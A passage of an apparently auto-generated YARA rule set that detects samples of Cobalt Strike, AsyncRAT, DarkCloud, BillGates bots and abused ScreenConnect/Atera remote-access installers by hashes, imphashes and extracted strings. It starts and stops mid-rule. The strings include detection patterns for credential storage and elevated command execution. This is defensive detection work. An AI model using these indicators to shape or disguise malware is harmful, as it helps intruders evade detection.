      $s11 = "RL_SCHEME]\\shell\\open\\command\"[INSTALLLOCATION]ScreenConnect.WindowsClient.exe\" \"%1\"reg3831C0C36D9CE44BC3E6FAE6F161BEA8Sy" ascii /* score: '20.00'*/
      $s12 = "<GetProcessIDs>d__40" fullword ascii /* score: '20.00'*/
      $s13 = "InprocServer32[#ScreenConnect.WindowsCredentialProvider.dll]regBE7B0E97E26F674069B85EA56F7ED91AThreadingModelApartmentreg6D36DB0" ascii /* score: '19.00'*/
      $s14 = "WindowsAuthenticationPackage.dlldyfhtzmg.dll|ScreenConnect.WindowsCredentialProvider.dllDefaultIconFindRelatedProductsLaunchCond" ascii /* score: '18.00'*/
      $s15 = "SKIPOWNPROCESS" fullword ascii /* score: '17.50'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 16000KB and pe.imphash() == "9771ee6344923fa220489ab01239bdfd" and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _BillGates_signature__BillGates_signature__2869d529_Do_loo_signature__21 {
   meta:
      description = "_subset_batch - from files BillGates(signature).elf, BillGates(signature)_2869d529.elf, Do-loo(signature).elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f1421e5744e8e9c53d26f5c5d27fed9701de331e2c590e8dc824c4e7b0468f08"
      hash2 = "2869d529c43385893d1fe718a1b9aebb16009e4f7dca75f82bd402b92bdc9735"
      hash3 = "14df565ad794f723733f5db396ddcb5be4d43cffc4bad7dabd1f18193a0049a5"
   strings:
      $s1 = "__pthread_mutex_unlock_usercnt" fullword ascii /* score: '21.00'*/
      $s2 = "__nscd_gethostbyname2_r" fullword ascii /* score: '14.00'*/
      $s3 = "__nscd_gethostbyname_r" fullword ascii /* score: '14.00'*/
      $s4 = "__nscd_gethostbyaddr_r" fullword ascii /* score: '14.00'*/
      $s5 = "__gethostname" fullword ascii /* score: '14.00'*/
      $s6 = "headmap" fullword ascii /* score: '13.00'*/
      $s7 = "_dl_make_stack_executable" fullword ascii /* score: '12.00'*/
      $s8 = "log_hashfraction" fullword ascii /* score: '12.00'*/
      $s9 = "__make_stacks_executable" fullword ascii /* score: '12.00'*/
      $s10 = "read_encoded_value_with_base" fullword ascii /* score: '12.00'*/
      $s11 = "__pthread_getspecific" fullword ascii /* score: '12.00'*/
      $s12 = "_dl_make_stack_executable_hook" fullword ascii /* score: '12.00'*/
      $s13 = "d_template_args" fullword ascii /* score: '11.00'*/
      $s14 = "_thread_db_pthread_key_data_seq" fullword ascii /* score: '10.00'*/
      $s15 = "__pthread_key_create" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 4000KB and ( 8 of them )
      ) or ( all of them )
}

rule _b93db3237adc9f9fb50c409480767c6d21f842474905c6df39f84698f5b2169e_b93db323_CobaltStrike_signature__9cbefe68f395e67356e2a5d8d_22 {
   meta:
      description = "_subset_batch - from files b93db3237adc9f9fb50c409480767c6d21f842474905c6df39f84698f5b2169e_b93db323.elf, CobaltStrike(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash).exe, CobaltStrike(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, d42595b695fc008ef2c56aabd8efd68e(imphash).exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_1fc8d079.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_41b402ff.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_4970e957.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_634ff4b4.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_72d757ad.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_7610fe95.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_7ed53caf.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_979bd820.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_9d83c505.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_c95056c2.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_f8818a24.exe, dd56a47d6b039b230286c0327d6693062fc843602ac0e3613214735503f798ed_dd56a47d.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b93db3237adc9f9fb50c409480767c6d21f842474905c6df39f84698f5b2169e"
      hash2 = "4390de792c33fb358e49444f5c40349d2f0929ccf1820b98bc4c29cd08ef475c"
      hash3 = "1bfa20d4e9e1348710eaaed406bd5e65302945ab0ce43ee0943884697781a0b1"
      hash4 = "1d5227118354b0c6d70089730cf121de3ba51e0d9c9c478189559b9e93a890ac"
      hash5 = "1fc8d0798605394a2a0dbc39c80bf5221483668c22faf6782e5254cbbd90a1d3"
      hash6 = "41b402ff6d432fcff5fb710bfb271bdf8d7838eaad5d7f35aac354036b40f18b"
      hash7 = "4970e95727c983c9fc09673db8e3a852c135fdcb74c60ce8b927808eb767f115"
      hash8 = "634ff4b4130189a88f970b2ee8c14109f52b20b51cef431bd4c65e9023a704c1"
      hash9 = "72d757ad3719b02a93bb17b3600d349d98fcc283ef168300ba8660ca1f5601d0"
      hash10 = "7610fe95df2a433e8d52377e8301642dacb2e66b19d695f568a6b745d68fd3c5"
      hash11 = "7ed53cafeb7ec84dbcd378cb16d732466ba9d3ed83a97c4b4a4dbd7ab7efe345"
      hash12 = "979bd8203f5ad91bb5cd844c51045a244004d6c43c88e11af7bb56cf312dfa6f"
      hash13 = "9d83c5056348b6a80c16232a49050485d3917ba93f1310921a9e7e4666142cf7"
      hash14 = "c95056c2dabb09cdb82d775737ebc1d6b4feab38256357ff66e3a122334e0cfc"
      hash15 = "f8818a247bfdfd7017a4c57867dc9f4f0ff9a59c792ad2c5652551a695b1a9a6"
      hash16 = "dd56a47d6b039b230286c0327d6693062fc843602ac0e3613214735503f798ed"
   strings:
      $s1 = "runtime.getempty" fullword ascii /* score: '22.00'*/
      $s2 = "runtime.getempty.func1" fullword ascii /* score: '22.00'*/
      $s3 = "runtime.execute" fullword ascii /* score: '21.00'*/
      $s4 = "runtime.dumpgstatus" fullword ascii /* score: '20.00'*/
      $s5 = "runtime.tracebackHexdump.func1" fullword ascii /* score: '20.00'*/
      $s6 = "runtime.gcDumpObject" fullword ascii /* score: '20.00'*/
      $s7 = "runtime.injectglist.func1" fullword ascii /* score: '20.00'*/
      $s8 = "runtime.hexdumpWords" fullword ascii /* score: '20.00'*/
      $s9 = "runtime.tracebackHexdump" fullword ascii /* score: '20.00'*/
      $s10 = "runtime.dumpregs" fullword ascii /* score: '20.00'*/
      $s11 = "runtime.injectglist" fullword ascii /* score: '20.00'*/
      $s12 = "*runtime.mutex" fullword ascii /* score: '18.00'*/
      $s13 = "runtime.(*rwmutex).runlock" fullword ascii /* score: '18.00'*/
      $s14 = "runtime.(*rwmutex).rlock.func1" fullword ascii /* score: '18.00'*/
      $s15 = "runtime.(*rwmutex).rlock" fullword ascii /* score: '18.00'*/
   condition:
      ( ( uint16(0) == 0x457f or uint16(0) == 0x5a4d ) and filesize < 24000KB and ( 8 of them )
      ) or ( all of them )
}

rule _d42595b695fc008ef2c56aabd8efd68e_imphash__4970e957_d42595b695fc008ef2c56aabd8efd68e_imphash__634ff4b4_d42595b695fc008ef2c56_23 {
   meta:
      description = "_subset_batch - from files d42595b695fc008ef2c56aabd8efd68e(imphash)_4970e957.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_634ff4b4.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_7ed53caf.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_9d83c505.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_f8818a24.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "4970e95727c983c9fc09673db8e3a852c135fdcb74c60ce8b927808eb767f115"
      hash2 = "634ff4b4130189a88f970b2ee8c14109f52b20b51cef431bd4c65e9023a704c1"
      hash3 = "7ed53cafeb7ec84dbcd378cb16d732466ba9d3ed83a97c4b4a4dbd7ab7efe345"
      hash4 = "9d83c5056348b6a80c16232a49050485d3917ba93f1310921a9e7e4666142cf7"
      hash5 = "f8818a247bfdfd7017a4c57867dc9f4f0ff9a59c792ad2c5652551a695b1a9a6"
   strings:
      $x1 = " runqueue= stopwait= runqsize= gfreecnt= throwing= spinning=atomicand8float64nanfloat32nanException  ptrSize=  targetpc= until p" ascii /* score: '54.00'*/
      $x2 = "lock: sleeping while lock is availableP has cached GC work at end of mark terminationfailed to acquire lock to start a GC transi" ascii /* score: '53.00'*/
      $x3 = "runtime.newosprocruntime/internal/internal/runtime/thread exhaustionlocked m0 woke upentersyscallblock spinningthreads=unknown c" ascii /* score: '50.00'*/
      $x4 = " (types from different scopes)notetsleep - waitm out of syncfailed to get system page sizeruntime: found in object at *( in prep" ascii /* score: '47.50'*/
      $x5 = "runtime.Pinner: object already unpinnedsuspendG from non-preemptible goroutineruntime: casfrom_Gscanstatus failed gp=stack growt" ascii /* score: '45.00'*/
      $x6 = "GODEBUG: value \"allowmultiplevcspermission deniedwrong medium typeno data availableexec format errorLookupAccountSidWDnsRecordL" ascii /* score: '43.00'*/
      $x7 = "runtime: bad notifyList size - sync=accessed data from freed user arena runtime: wrong goroutine in newstackruntime: invalid pc-" ascii /* score: '42.00'*/
      $x8 = "_cgo_pthread_key_created missingruntime: sudog with non-nil elemruntime: sudog with non-nil nextruntime: sudog with non-nil prev" ascii /* score: '41.50'*/
      $x9 = "unlock: lock countprogToPointerMask: overflow/gc/cycles/forced:gc-cycles/memory/classes/other:bytes/memory/classes/total:bytesfa" ascii /* score: '41.00'*/
      $x10 = "mheap.freeSpanLocked - invalid free of user arena chunkcasfrom_Gscanstatus:top gp->status is not in scan state is currently not " ascii /* score: '40.00'*/
      $x11 = ", locked to threadruntime.semacreateruntime.semawakeupx509negativeserialbad file descriptordisk quota exceededtoo many open file" ascii /* score: '39.00'*/
      $x12 = "pacer: assist ratio=workbuf is not emptybad use of bucket.mpbad use of bucket.bppreempt off reason: forcegc: phase errorgopark: " ascii /* score: '39.00'*/
      $x13 = "lock: lock countbad system huge page sizearena already initialized to unused region of span bytes failed with errno=runtime: Vir" ascii /* score: '36.00'*/
      $x14 = "stopm spinning nmidlelocked= needspinning=randinit twicestore64 failedsemaRoot queuebad allocCountbad span statestack overflow u" ascii /* score: '35.00'*/
      $x15 = "runtime: casgstatus: oldval=gcstopm: negative nmspinningfindrunnable: netpoll with psave on system g not allowednewproc1: newg m" ascii /* score: '35.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 23000KB and pe.imphash() == "d42595b695fc008ef2c56aabd8efd68e" and ( 1 of ($x*) )
      ) or ( all of them )
}

rule _ConnectWise_signature__ConnectWise_signature__02f9c24b_ConnectWise_signature__3736f158_ConnectWise_signature__9771ee6344923_24 {
   meta:
      description = "_subset_batch - from files ConnectWise(signature).msi, ConnectWise(signature)_02f9c24b.msi, ConnectWise(signature)_3736f158.msi, ConnectWise(signature)_9771ee6344923fa220489ab01239bdfd(imphash).exe, ConnectWise(signature)_9771ee6344923fa220489ab01239bdfd(imphash)_64049e05.exe, ConnectWise(signature)_9771ee6344923fa220489ab01239bdfd(imphash)_9c150d19.exe, ConnectWise(signature)_9771ee6344923fa220489ab01239bdfd(imphash)_d7231f53.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "3395bb897abb4315adc2f4de84f8586e488de531433c82b3208b84e65a161617"
      hash2 = "02f9c24b8b65fb02f6040e867822f7a013daa6ac1ed2664ac8a21f7a8511d31d"
      hash3 = "3736f158f14a152920163270add0c7b202650ea3524ab584e3ce91088e1bccb0"
      hash4 = "f756bec198768208848f3cf30d4439c47bdfe58f0fbd27cd6570295edbeaed64"
      hash5 = "64049e058f3414066b1b68f84306ec307670b4e93543888b6e40d8e18b74b718"
      hash6 = "9c150d1942236b0550489577f9373f97294f5431b256e2c5d2f706589b47873d"
      hash7 = "d7231f539456fe65fbc9633f08e098e62558b33763787f07fe6d3bac054cfcf6"
   strings:
      $s1 = "un if failure action is RUN_COMMAND.RebootMessageMessage to show to users when rebooting if failure action is REBOOT.ServiceCont" ascii /* score: '29.00'*/
      $s2 = "Specify your proxy server and optional credentials. These values will be preferred when connecting to your session. However, oth" ascii /* score: '28.00'*/
      $s3 = "CommandStoreLoginCredentials" fullword wide /* score: '28.00'*/
      $s4 = "ScreenConnect.WindowsBackstageShell.exe" fullword ascii /* score: '27.00'*/
      $s5 = "ScreenConnect.ClientService.dll" fullword ascii /* score: '26.00'*/
      $s6 = "r .EXE) or icon (.ICO) format.InstallExecuteSequenceInstallUISequenceLaunchConditionExpression which must evaluate to TRUE in or" ascii /* score: '25.00'*/
      $s7 = "oFailed to load mscoree.dll (Error code %d). This custom action requires the .NET Framework to be installed." fullword wide /* score: '25.00'*/
      $s8 = "3Request passwordless elevation from administration." fullword ascii /* score: '24.00'*/
      $s9 = "CommandRunToolElevated" fullword wide /* score: '24.00'*/
      $s10 = "ScreenConnect.Client.dll" fullword ascii /* score: '23.00'*/
      $s11 = "f columnAdminExecuteSequenceActionName of action to invoke, either in the engine or the handler DLL.ConditionOptional expression" ascii /* score: '23.00'*/
      $s12 = "vWARNING: If Windows UAC is enabled, you will temporarily lose control while Guest  is prompted (Yes/No) for elevation." fullword ascii /* score: '23.00'*/
      $s13 = "ScreenConnect.InstallerActions.dll" fullword wide /* score: '23.00'*/
      $s14 = "ScreenConnect.Core.dll" fullword ascii /* score: '23.00'*/
      $s15 = "ScreenConnect.WindowsCredentialProvider.dll" fullword ascii /* score: '23.00'*/
   condition:
      ( ( uint16(0) == 0xcfd0 or uint16(0) == 0x5a4d ) and filesize < 29000KB and pe.imphash() == "9771ee6344923fa220489ab01239bdfd" and ( 8 of them )
      ) or ( all of them )
}

rule _AsyncRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__16a1317a_AsyncRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_25 {
   meta:
      description = "_subset_batch - from files AsyncRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_16a1317a.exe, AsyncRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_ff37506f.exe, dae02f32a21e03ce65412f6e56942daa(imphash)_a777f34b.dll"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "16a1317ad2b3a3464c1c97066ce8329a96b226607760393c29eb145e8c7c666c"
      hash2 = "ff37506f2c1d82d61f2eadefe66a685d1142d29b7790d90b76c5969a282cc752"
      hash3 = "a777f34b8c2036c49b90b964ac92a74d4ac008db9c3ddfa3eb61e7e3f7c6ee8a"
   strings:
      $s1 = "gSystem.Net.Mail.MailPriority, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" fullword ascii /* score: '30.00'*/
      $s2 = "rSystem.Diagnostics.ProcessPriorityClass, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" fullword ascii /* score: '28.00'*/
      $s3 = "XSystem.Guid, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089$00000000-0000-0000-0000-000000000000" fullword ascii /* score: '27.00'*/
      $s4 = "FileZSystem.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" fullword ascii /* score: '27.00'*/
      $s5 = "[System.Version, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" fullword ascii /* score: '24.00'*/
      $s6 = "]System.Attribute, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" fullword ascii /* score: '24.00'*/
      $s7 = "get_ProcessTokenSidType" fullword ascii /* score: '23.00'*/
      $s8 = "SessionProcessLaunchFailed" fullword ascii /* score: '21.00'*/
      $s9 = "get_ExecutionTimeLimit" fullword ascii /* score: '21.00'*/
      $s10 = "5Microsoft.Win32.TaskScheduler.TaskProcessTokenSidType" fullword ascii /* score: '21.00'*/
      $s11 = "SessionProcessConnectFailed" fullword ascii /* score: '21.00'*/
      $s12 = "SessionFailedToProcessMessage" fullword ascii /* score: '21.00'*/
      $s13 = "SessionProcessStarted" fullword ascii /* score: '18.00'*/
      $s14 = "SessionProcessReceivedStartJob" fullword ascii /* score: '18.00'*/
      $s15 = "ScheduleServiceCredStoreInitError" fullword ascii /* score: '18.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 15000KB and ( 8 of them )
      ) or ( all of them )
}

rule _DarkCloud_signature__1895460fffad9475fda0c84755ecfee1_imphash__DarkCloud_signature__1895460fffad9475fda0c84755ecfee1_imphas_26 {
   meta:
      description = "_subset_batch - from files DarkCloud(signature)_1895460fffad9475fda0c84755ecfee1(imphash).exe, DarkCloud(signature)_1895460fffad9475fda0c84755ecfee1(imphash)_1299212c.exe, DarkCloud(signature)_1895460fffad9475fda0c84755ecfee1(imphash)_b2f0abb6.exe, E-piro(signature)_91d07a5e22681e70764519ae943a5883(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f1be8acbb066d665acd6f4811ecccd4bfb2985ec05b793ba41866c9430c8abf9"
      hash2 = "1299212cf0cc520f9223a4911d3bfd63adc2397bf203743b23e7a4e9d52ae358"
      hash3 = "b2f0abb607e32c67526d484c17b613dc9017d5810b1fe1143a68e41ab7c28a17"
      hash4 = "59c3fe8651eb9d7fd5a974bd8a6eca5cb93395aea276abf75b1ca9039b1999c9"
   strings:
      $s1 = "/AutoIt3ExecuteScript" fullword wide /* PEStudio Blacklist: strings */ /* score: '26.00'*/
      $s2 = "/AutoIt3ExecuteLine" fullword wide /* PEStudio Blacklist: strings */ /* score: '23.00'*/
      $s3 = "PROCESSGETSTATS" fullword wide /* score: '22.50'*/
      $s4 = "WINGETPROCESS" fullword wide /* score: '22.50'*/
      $s5 = "SCRIPTNAME" fullword wide /* base64 encoded string 'H$H=3@0' */ /* score: '22.50'*/
      $s6 = "SHELLEXECUTEWAIT" fullword wide /* PEStudio Blacklist: strings */ /* score: '21.50'*/
      $s7 = "SHELLEXECUTE" fullword wide /* PEStudio Blacklist: strings */ /* score: '21.50'*/
      $s8 = "*Unable to get a list of running processes." fullword wide /* score: '20.00'*/
      $s9 = "PROCESSSETPRIORITY" fullword wide /* score: '17.50'*/
      $s10 = "HTTPSETUSERAGENT" fullword wide /* score: '17.50'*/
      $s11 = "PROCESSWAITCLOSE" fullword wide /* score: '17.50'*/
      $s12 = "PROCESSEXISTS" fullword wide /* score: '17.50'*/
      $s13 = "PROCESSCLOSE" fullword wide /* score: '17.50'*/
      $s14 = "PROCESSWAIT" fullword wide /* score: '17.50'*/
      $s15 = "PROCESSLIST" fullword wide /* score: '17.50'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 5000KB and ( 8 of them )
      ) or ( all of them )
}

rule _AsyncRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__16a1317a_AsyncRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_27 {
   meta:
      description = "_subset_batch - from files AsyncRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_16a1317a.exe, AsyncRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_ff37506f.exe, dae02f32a21e03ce65412f6e56942daa(imphash)_612ed5ba.dll, dae02f32a21e03ce65412f6e56942daa(imphash)_bb723217.dll"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "16a1317ad2b3a3464c1c97066ce8329a96b226607760393c29eb145e8c7c666c"
      hash2 = "ff37506f2c1d82d61f2eadefe66a685d1142d29b7790d90b76c5969a282cc752"
      hash3 = "612ed5ba60f450bd094dcf6a19dc3e41b94e056deb2bd7857a3fb3b15a0e7bce"
      hash4 = "bb723217f9c2932116c9e1313d558a7baddb921886eaa3beca95f7b3c5b848b0"
   strings:
      $s1 = "TOKEN_ELEVATION" fullword ascii /* score: '19.00'*/
      $s2 = "TokenIsElevated" fullword ascii /* score: '16.00'*/
      $s3 = "GetRecycled" fullword ascii /* score: '12.00'*/
      $s4 = "get_KeyFormat" fullword ascii /* score: '12.00'*/
      $s5 = "get_MapKeyFormat" fullword ascii /* score: '12.00'*/
      $s6 = "WriteGetKeyImpl" fullword ascii /* score: '12.00'*/
      $s7 = "get_EnumPassthruHasValue" fullword ascii /* score: '12.00'*/
      $s8 = "get_RequireAdd" fullword ascii /* score: '12.00'*/
      $s9 = "ProtoBuf.IProtoInput<System.ArraySegment<System.Byte>>.Deserialize" fullword ascii /* score: '10.00'*/
      $s10 = "ProtoBuf.IProtoOutput<System.IO.Stream>.Serialize" fullword ascii /* score: '10.00'*/
      $s11 = "JPlease use ProtoReader.Create; this API may be removed in a future version" fullword ascii /* score: '10.00'*/
      $s12 = "ProtoBuf.IProtoInput<System.Byte[]>.Deserialize" fullword ascii /* score: '10.00'*/
      $s13 = "ProtoBuf.IProtoInput<System.IO.Stream>.Deserialize" fullword ascii /* score: '10.00'*/
      $s14 = "BCRYPT_INIT_AUTH_MODE_INFO_VERSION" fullword ascii /* score: '10.00'*/
      $s15 = "CommonImports" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 10000KB and ( 8 of them )
      ) or ( all of them )
}

rule _AteraAgent_signature__ConnectWise_signature__ConnectWise_signature__02f9c24b_ConnectWise_signature__3736f158_ConnectWise_si_28 {
   meta:
      description = "_subset_batch - from files AteraAgent(signature).msi, ConnectWise(signature).msi, ConnectWise(signature)_02f9c24b.msi, ConnectWise(signature)_3736f158.msi, ConnectWise(signature)_9771ee6344923fa220489ab01239bdfd(imphash).exe, ConnectWise(signature)_9771ee6344923fa220489ab01239bdfd(imphash)_64049e05.exe, ConnectWise(signature)_9771ee6344923fa220489ab01239bdfd(imphash)_9c150d19.exe, ConnectWise(signature)_9771ee6344923fa220489ab01239bdfd(imphash)_d7231f53.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "d530d71ebf3d31c788def4ec823fe488d69e42bf2dd75b1937ab78fc52de673d"
      hash2 = "3395bb897abb4315adc2f4de84f8586e488de531433c82b3208b84e65a161617"
      hash3 = "02f9c24b8b65fb02f6040e867822f7a013daa6ac1ed2664ac8a21f7a8511d31d"
      hash4 = "3736f158f14a152920163270add0c7b202650ea3524ab584e3ce91088e1bccb0"
      hash5 = "f756bec198768208848f3cf30d4439c47bdfe58f0fbd27cd6570295edbeaed64"
      hash6 = "64049e058f3414066b1b68f84306ec307670b4e93543888b6e40d8e18b74b718"
      hash7 = "9c150d1942236b0550489577f9373f97294f5431b256e2c5d2f706589b47873d"
      hash8 = "d7231f539456fe65fbc9633f08e098e62558b33763787f07fe6d3bac054cfcf6"
   strings:
      $x1 = "rstrtmgr.dll" fullword wide /* reversed goodware string 'lld.rgmtrtsr' */ /* score: '33.00'*/
      $s2 = "failed to get WixShellExecBinaryId" fullword ascii /* score: '29.00'*/
      $s3 = "failed to get handle to kernel32.dll" fullword ascii /* score: '28.00'*/
      $s4 = "failed to process target from CustomActionData" fullword ascii /* score: '28.00'*/
      $s5 = "failed to get WixShellExecTarget" fullword ascii /* score: '26.00'*/
      $s6 = "failed to get security descriptor's DACL - error code: %d" fullword ascii /* score: '26.00'*/
      $s7 = "The process, %ls, could not be registered with the Restart Manager (probably because the setup is not elevated and the process i" ascii /* score: '26.00'*/
      $s8 = "failed to schedule ExecServiceConfig action" fullword ascii /* score: '25.00'*/
      $s9 = "App: %ls found running, %d processes, attempting to send message." fullword ascii /* score: '25.00'*/
      $s10 = "Command failed to execute." fullword ascii /* score: '25.00'*/
      $s11 = "failed to openexecute temp view with query %ls" fullword ascii /* score: '24.00'*/
      $s12 = "Microsoft.Deployment.WindowsInstaller.dll" fullword ascii /* score: '23.00'*/
      $s13 = "WixShellExecTarget is %ls" fullword ascii /* score: '23.00'*/
      $s14 = "The process, %ls, could not be registered with the Restart Manager (probably because the setup is not elevated and the process i" ascii /* score: '23.00'*/
      $s15 = "failed to get message to send to users when server reboots due to service failure." fullword ascii /* score: '23.00'*/
   condition:
      ( ( uint16(0) == 0xcfd0 or uint16(0) == 0x5a4d ) and filesize < 29000KB and pe.imphash() == "9771ee6344923fa220489ab01239bdfd" and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _b93db3237adc9f9fb50c409480767c6d21f842474905c6df39f84698f5b2169e_b93db323_CobaltStrike_signature__d42595b695fc008ef2c56aabd_29 {
   meta:
      description = "_subset_batch - from files b93db3237adc9f9fb50c409480767c6d21f842474905c6df39f84698f5b2169e_b93db323.elf, CobaltStrike(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, d42595b695fc008ef2c56aabd8efd68e(imphash).exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_1fc8d079.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_41b402ff.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_4970e957.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_634ff4b4.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_72d757ad.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_7610fe95.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_7ed53caf.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_979bd820.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_9d83c505.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_c95056c2.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_f8818a24.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b93db3237adc9f9fb50c409480767c6d21f842474905c6df39f84698f5b2169e"
      hash2 = "1bfa20d4e9e1348710eaaed406bd5e65302945ab0ce43ee0943884697781a0b1"
      hash3 = "1d5227118354b0c6d70089730cf121de3ba51e0d9c9c478189559b9e93a890ac"
      hash4 = "1fc8d0798605394a2a0dbc39c80bf5221483668c22faf6782e5254cbbd90a1d3"
      hash5 = "41b402ff6d432fcff5fb710bfb271bdf8d7838eaad5d7f35aac354036b40f18b"
      hash6 = "4970e95727c983c9fc09673db8e3a852c135fdcb74c60ce8b927808eb767f115"
      hash7 = "634ff4b4130189a88f970b2ee8c14109f52b20b51cef431bd4c65e9023a704c1"
      hash8 = "72d757ad3719b02a93bb17b3600d349d98fcc283ef168300ba8660ca1f5601d0"
      hash9 = "7610fe95df2a433e8d52377e8301642dacb2e66b19d695f568a6b745d68fd3c5"
      hash10 = "7ed53cafeb7ec84dbcd378cb16d732466ba9d3ed83a97c4b4a4dbd7ab7efe345"
      hash11 = "979bd8203f5ad91bb5cd844c51045a244004d6c43c88e11af7bb56cf312dfa6f"
      hash12 = "9d83c5056348b6a80c16232a49050485d3917ba93f1310921a9e7e4666142cf7"
      hash13 = "c95056c2dabb09cdb82d775737ebc1d6b4feab38256357ff66e3a122334e0cfc"
      hash14 = "f8818a247bfdfd7017a4c57867dc9f4f0ff9a59c792ad2c5652551a695b1a9a6"
   strings:
      $s1 = "sync/atomic.(*Pointer[go.shape.struct { internal/bisect.recent [128][4]uint64; internal/bisect.mu sync.Mutex; internal/bisect.m " ascii /* score: '22.00'*/
      $s2 = "runtime.totalMutexWaitTimeNanos" fullword ascii /* score: '21.00'*/
      $s3 = "runtime.dumpStacksRec" fullword ascii /* score: '20.00'*/
      $s4 = "runtime.dumpTypesRec" fullword ascii /* score: '20.00'*/
      $s5 = "ntptr; runtime.fn func(); runtime.link *runtime._defer; runtime.head *internal/runtime/atomic.Pointer[runtime._defer] }]).Compar" ascii /* score: '19.00'*/
      $s6 = "internal/runtime/atomic.(*Pointer[go.shape.struct { runtime.heap bool; runtime.rangefunc bool; runtime.sp uintptr; runtime.pc ui" ascii /* score: '19.00'*/
      $s7 = "internal/sync.runtime_SemacquireMutex" fullword ascii /* score: '18.00'*/
      $s8 = "internal/runtime/maps.mapKeyError" fullword ascii /* score: '18.00'*/
      $s9 = "targetpc" fullword ascii /* score: '18.00'*/
      $s10 = "runtime.(*rwmutex).init" fullword ascii /* score: '18.00'*/
      $s11 = "runtime.(*traceTypeTable).dump" fullword ascii /* score: '17.00'*/
      $s12 = "runtime.(*traceStackTable).dump" fullword ascii /* score: '17.00'*/
      $s13 = "runtime.mallocgcSmallScanHeader" fullword ascii /* score: '16.00'*/
      $s14 = "runtime.mallocgcSmallScanNoHeader" fullword ascii /* score: '16.00'*/
      $s15 = "sync/atomic.(*Pointer[go.shape.struct { internal/sync.node = internal/sync.node[go.shape.interface {},go.shape.interface {}]; in" ascii /* score: '15.00'*/
   condition:
      ( ( uint16(0) == 0x457f or uint16(0) == 0x5a4d ) and filesize < 24000KB and pe.imphash() == "d42595b695fc008ef2c56aabd8efd68e" and ( 8 of them )
      ) or ( all of them )
}

rule _d42595b695fc008ef2c56aabd8efd68e_imphash__d42595b695fc008ef2c56aabd8efd68e_imphash__1fc8d079_d42595b695fc008ef2c56aabd8efd6_30 {
   meta:
      description = "_subset_batch - from files d42595b695fc008ef2c56aabd8efd68e(imphash).exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_1fc8d079.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_41b402ff.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_7610fe95.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_979bd820.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "1d5227118354b0c6d70089730cf121de3ba51e0d9c9c478189559b9e93a890ac"
      hash2 = "1fc8d0798605394a2a0dbc39c80bf5221483668c22faf6782e5254cbbd90a1d3"
      hash3 = "41b402ff6d432fcff5fb710bfb271bdf8d7838eaad5d7f35aac354036b40f18b"
